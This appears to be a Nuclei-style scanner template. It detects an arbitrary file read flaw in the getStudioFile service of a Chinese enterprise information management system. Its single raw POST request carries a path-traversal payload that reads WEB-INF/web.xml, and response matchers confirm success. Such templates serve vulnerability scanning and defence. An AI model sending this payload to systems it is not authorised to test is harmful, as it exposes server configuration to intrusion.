id: poc-yaml-skzy-eims-getstudiofile-anyfile-read
info:
  name: 时空智友企业信息管理系统 getStudioFile 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read

http:
  - raw:
      - |
        POST /formservice?service=updater.getStudioFile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        ..\..\WEB-INF/web.xml
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "</web-app>"
          - "<listener>"
        part: body
      - type: word
        words:
          - "filename="
        part: header
      - type: word
        words:
          - "application/octet-stream"
        part: header
